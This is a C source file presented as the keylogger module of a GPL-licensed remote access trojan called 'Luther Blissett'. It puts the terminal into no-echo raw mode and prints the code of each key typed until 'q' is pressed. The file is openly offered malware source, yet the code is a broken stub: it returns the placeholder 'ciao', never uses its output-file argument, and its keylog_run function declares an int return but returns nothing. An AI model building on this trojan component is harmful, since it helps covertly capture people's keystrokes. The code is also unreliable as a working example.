/*
 *  Luther Blissett  --  Remote Access Trojan
 *  Copyright (C) 2024  Davide Usberti aka UsboKirishima
 *
 *  Luther Blissett is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Luther Blissett is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Luther Blissett.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>

#include <keylogger.h>

static bool is_keylogger_active = false;

bool keylogger_toggle() {
  is_keylogger_active = !is_keylogger_active;

  return is_keylogger_active;
}

char *keylogger_buffer() {
  struct termios old_tio, new_tio;
  unsigned char c;

  tcgetattr(STDIN_FILENO, &old_tio);

  new_tio = old_tio;

  new_tio.c_lflag &= (~ICANON & ~ECHO);

  tcsetattr(STDIN_FILENO, TCSANOW, &new_tio);

  do {
    c = getchar();
    printf("%d ", c);
  } while (c != 'q');

  /* restore the former settings */
  tcsetattr(STDIN_FILENO, TCSANOW, &old_tio);

  return "ciao";
}

int keylog_run(const char *output_file_path) { keylogger_buffer(); }